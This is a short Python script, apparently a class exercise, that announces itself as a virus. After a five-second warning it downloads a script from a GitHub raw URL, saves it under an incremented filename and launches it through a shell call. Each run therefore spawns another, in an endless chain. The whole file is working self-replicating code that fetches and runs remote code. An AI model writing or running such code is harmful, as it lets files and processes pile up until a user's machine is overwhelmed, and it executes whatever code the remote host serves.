import time
import os
import inspect
import subprocess

import urllib.request

print("Greetings, this is your friendly neighbourhood virus.")
print("To stop me, close this terminal before I print the 'proceeding' message.")
time.sleep(5)
print("proceeding")

#get filename and path of current instance, and do some evaluations on it
filename = inspect.getframeinfo(inspect.currentframe()).filename
path = os.path.dirname(os.path.abspath(filename))

lastindexof=str(filename).rfind('\\')
filename_only=str(filename)[lastindexof+1:]
filename_length=len(filename_only)

#Download and store newest version
download_raw="https://raw.githubusercontent.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher/Anderfuhren/lb1_virus_patience_reloaded.py"

targetfilename=None
if(filename_length!=30):
	count=int(filename_only[27:-3])
	count=count+1
	targetfilename=filename_only[:27]+str(count)+".py"
else:
	targetfilename=filename_only[:-3]+"1.py"

#the actual download and store process
local_filename, headers = urllib.request.urlretrieve(download_raw, filename=targetfilename)

#prepare filename to be callable
filestring=str(targetfilename)
filestring='"'+filestring+'"'

#run new instance
subprocess.call("start python "+filestring, shell=True)

print("end of instance")
